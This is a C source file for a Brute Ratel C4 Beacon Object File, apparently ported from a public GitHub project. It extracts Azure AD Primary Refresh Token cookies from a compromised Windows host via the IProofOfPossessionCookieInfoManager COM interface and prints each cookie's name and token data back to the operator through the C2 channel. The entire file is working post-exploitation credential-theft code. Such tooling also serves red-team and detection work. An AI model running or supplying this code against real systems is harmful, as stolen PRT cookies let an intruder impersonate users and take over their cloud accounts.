/*
 * aad_prt.c — AAD PRT Cookie Extractor (BRC4 BOF)
 * Extracts Azure AD Primary Refresh Token cookies via
 * IProofOfPossessionCookieInfoManager COM interface.
 *
 * Usage: aad_prt [nonce]
 *   nonce - optional SSO nonce for targeted PRT request
 *
 * Ported from: https://github.com/wotwot563/aad_prt_bof
 */

#include <windows.h>
#include "badger_exports.h"

/* Win32 API imports */
DECLSPEC_IMPORT LPWSTR  Kernel32$lstrcpynW(LPWSTR, LPCWSTR, int);
DECLSPEC_IMPORT LPWSTR  Kernel32$lstrcatW(LPWSTR, LPCWSTR);
DECLSPEC_IMPORT int     Kernel32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

DECLSPEC_IMPORT HRESULT Ole32$CLSIDFromString(LPCOLESTR, LPCLSID);
DECLSPEC_IMPORT HRESULT Ole32$IIDFromString(LPCOLESTR, LPIID);
DECLSPEC_IMPORT HRESULT Ole32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT Ole32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID *);
DECLSPEC_IMPORT void    Ole32$CoTaskMemFree(LPVOID);

DECLSPEC_IMPORT size_t  Msvcrt$wcslen(const wchar_t *);
DECLSPEC_IMPORT size_t  Msvcrt$strlen(const char *);

/* COM interface definitions (inline to avoid SDK header dependencies) */
typedef struct {
    LPWSTR name;
    LPWSTR data;
    DWORD  flags;
    LPWSTR p3pHeader;
} PoP_CookieInfo;

typedef struct IPoP_CookieManagerVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void *);
    ULONG   (STDMETHODCALLTYPE *Release)(void *);
    HRESULT (STDMETHODCALLTYPE *GetCookieInfoForUri)(void *, LPCWSTR, DWORD *, PoP_CookieInfo **);
} IPoP_CookieManagerVtbl;

typedef struct {
    IPoP_CookieManagerVtbl *lpVtbl;
} IPoP_CookieManager;

static int requestaadprt(WCHAR **dispatch, const wchar_t *nonce) {
    LPCWSTR uri = L"https://login.microsoftonline.com/";
    wchar_t *full_uri = NULL;

    if (nonce != NULL && Msvcrt$wcslen(nonce) > 0) {
        const wchar_t *base = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";
        size_t len = Msvcrt$wcslen(base) + Msvcrt$wcslen(nonce) + 2;
        full_uri = (wchar_t *)BadgerAlloc(len * sizeof(wchar_t));
        if (!full_uri) {
            BadgerDispatch(dispatch, "[-] alloc failed\n");
            return 1;
        }
        BadgerMemset(full_uri, 0, len * sizeof(wchar_t));
        Kernel32$lstrcpynW(full_uri, base, (int)(Msvcrt$wcslen(base) + 1));
        Kernel32$lstrcatW(full_uri, nonce);
        uri = full_uri;
    }

    BadgerDispatch(dispatch, "[*] URI: %ls\n", uri);

    GUID clsid, iid;
    Ole32$CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &clsid);
    Ole32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &iid);

    HRESULT hr = Ole32$CoInitializeEx(NULL, 0x0);
    if (hr == (HRESULT)0x80010106L) /* RPC_E_CHANGED_MODE */
        hr = Ole32$CoInitializeEx(NULL, 0x2);
    if (FAILED(hr)) {
        BadgerDispatch(dispatch, "[-] CoInitialize: 0x%08x\n", hr);
        goto cleanup;
    }

    IPoP_CookieManager *mgr = NULL;
    hr = Ole32$CoCreateInstance(&clsid, NULL, 0x1 /* CLSCTX_INPROC_SERVER */, &iid, (void **)&mgr);
    if (FAILED(hr)) {
        BadgerDispatch(dispatch, "[-] CoCreateInstance: 0x%08x\n", hr);
        goto cleanup;
    }

    DWORD count = 0;
    PoP_CookieInfo *cookies = NULL;
    hr = mgr->lpVtbl->GetCookieInfoForUri(mgr, uri, &count, &cookies);
    if (FAILED(hr)) {
        BadgerDispatch(dispatch, "[-] GetCookieInfoForUri: 0x%08x\n", hr);
        goto cleanup;
    }

    if (count == 0) {
        BadgerDispatch(dispatch, "[-] No cookies for URI\n");
        goto cleanup;
    }

    BadgerDispatch(dispatch, "[+] Found %lu cookie(s)\n\n", count);

    for (DWORD i = 0; i < count; i++) {
        BadgerDispatch(dispatch, "[Cookie %lu]\n", i);
        BadgerDispatch(dispatch, "  Name:      %ls\n", cookies[i].name);
        BadgerDispatch(dispatch, "  Data:      %ls\n", cookies[i].data);
        BadgerDispatch(dispatch, "  Flags:     0x%x\n", cookies[i].flags);
        BadgerDispatch(dispatch, "  P3PHeader: %ls\n\n", cookies[i].p3pHeader);

        Ole32$CoTaskMemFree(cookies[i].name);
        Ole32$CoTaskMemFree(cookies[i].data);
        Ole32$CoTaskMemFree(cookies[i].p3pHeader);
    }
    Ole32$CoTaskMemFree(cookies);

cleanup:
    if (full_uri) BadgerFree((PVOID *)&full_uri);
    return 0;
}

void coffee(char **argv, int argc, WCHAR **dispatch) {
    g_dispatch = dispatch;

    BadgerDispatch(dispatch, "=================================\n");
    BadgerDispatch(dispatch, "  AAD PRT Cookie Extractor\n");
    BadgerDispatch(dispatch, "=================================\n\n");

    wchar_t *nonce = NULL;

    if (argc >= 2 && argv[1] != NULL && Msvcrt$strlen(argv[1]) > 0) {
        int len = Kernel32$MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
        if (len > 0) {
            nonce = (wchar_t *)BadgerAlloc(len * sizeof(wchar_t));
            if (nonce) {
                BadgerMemset(nonce, 0, len * sizeof(wchar_t));
                Kernel32$MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, nonce, len);
                BadgerDispatch(dispatch, "[*] Nonce: %ls\n", nonce);
            }
        }
    } else {
        BadgerDispatch(dispatch, "[*] No nonce provided, using default URI\n");
    }

    requestaadprt(dispatch, nonce);

    if (nonce) BadgerFree((PVOID *)&nonce);
}
